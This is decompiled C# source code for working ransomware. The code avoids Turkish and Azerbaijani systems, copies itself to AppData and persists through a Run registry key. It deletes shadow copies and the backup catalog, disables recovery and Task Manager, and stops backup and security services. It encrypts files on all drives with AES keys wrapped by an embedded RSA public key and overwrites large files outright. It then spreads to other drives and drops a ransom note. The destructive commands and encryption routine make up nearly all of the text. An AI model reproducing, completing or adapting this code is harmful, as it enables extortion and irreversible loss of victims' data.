		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.get_CurrentInputLanguage().get_Culture().Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString()!.Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			string extension;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120L)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string value = array2[num];
				if (directory.Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>wa+SWdCL8ACuDLa8P49CPK2+ps4tTqWD0takGaMZmQX9NXvjf8oiAXEDrHWrcX+CjIXwy5aWCkGHT7bCGqTxaI60NhF8svYM7TyzmG8miU8BgiHxjuzIUQIYNHmMNOPoi+v1K2/Fac5W2rfvxpiJhXFhV81P9T5gih540VeNDOAUXgmIgbdLJlrPBSmeR0DxYbRXaAErfm4TitcXeRW4uW8do0s31L8VZpp5/eiw1VgkLmVKPIK6w4cPmkz0/o8AC09h9QZQwB6c5JKxbPEj+G0Pds0zEC7HAyBgm39y9sxYWpAvcie8i+9eLDLu6cuDF3rBWGgAoyHoDodct+IqQQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_0190: Unknown result type (might be due to invalid IL or missing references)
		//IL_0196: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
